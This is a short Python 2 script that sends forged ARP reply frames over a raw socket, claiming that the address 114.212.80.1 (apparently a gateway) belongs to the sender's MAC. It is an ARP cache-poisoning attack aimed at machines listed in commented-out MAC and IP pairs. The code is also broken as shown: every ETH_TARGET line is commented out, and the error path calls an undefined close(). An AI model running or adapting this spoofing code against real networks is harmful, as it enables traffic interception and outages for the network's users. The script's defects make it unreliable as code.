import sys
import struct
import os
import socket
import string


#ETH_TARGET = '\x00\xe0\x4c\x53\x44\x58'
#another_IP = "114.212.87.245"

#ETH_TARGET = '\x00\x23\x9c\xde\xd5\x28'
#another_IP = "114.212.86.125"

#ETH_TARGET = '\x00\x23\x9c\xde\xd5\x28'
#another_IP = "114.212.86.120"

#ETH_TARGET = '\x50\xe5\x49\x47\x1a\x8c'
#another_IP = "114.212.86.146"

#ETH_TARGET = '\x90\x2b\x34\x5d\xa7\xe3'
#another_IP = "114.212.83.200"

#ETH_TARGET = '\x50\xe5\x49\x47\x1a\x8c'
#another_IP = "114.212.87.146"


false_IP = '114.212.80.1'

ETH_TYPE_ARP= 0x0806


net_CARD = 'eth0'

def send_arp( ifname , address ):
	""" send out a arp """
	try:
		eth_socket =  socket.socket( socket.AF_PACKET , socket.SOCK_RAW) ;
		eth_socket.bind( (ifname , ETH_TYPE_ARP) ) ;
#		print eth_socket.getsockname() ;
		eth_addr = eth_socket.getsockname()[4] ;
		
	except socket.error, (errno , msg ) :
		if errno == 1 :
			print "arp message can only be sent by root" 
			close( eth_socket ) ;
			return False ;
	
	arp_frame = [
		struct.pack( "!h" , 1 ) ,

		struct.pack("!h", 0x0800 ) ,

		struct.pack("!B" , 6 ) ,

		struct.pack("!B" , 4 ) ,

		struct.pack("!h" , 2 ) ,

		eth_addr ,

		socket.inet_aton( address ) ,

		eth_addr ,

		socket.inet_aton( address )
	]

	eth_frame = [
		ETH_TARGET,

		eth_addr ,
		struct.pack("!h" , ETH_TYPE_ARP ),
		''.join( arp_frame )

	]

	eth_socket.send(''.join(eth_frame) );
	eth_socket.close();



if __name__ == '__main__':
	send_arp( net_CARD , false_IP );
	print "lllll"

